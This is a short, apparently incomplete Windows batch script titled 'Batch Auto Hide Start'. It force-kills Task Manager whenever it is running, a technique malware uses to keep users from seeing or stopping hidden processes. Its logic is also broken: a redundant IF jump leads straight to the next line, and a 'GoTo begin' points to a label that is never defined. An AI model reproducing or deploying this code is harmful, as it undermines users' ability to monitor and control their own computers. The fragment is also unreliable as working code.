@echo off
Title Batch Auto Hide Start By Rythorian77 (AKA Black Star)
:Commandline
IF ["%~1"]==["-e"] goto o
:o
Taskkill /IM taskmgr.exe /FI "STATUS eq RUNNING" /F
GoTo begin
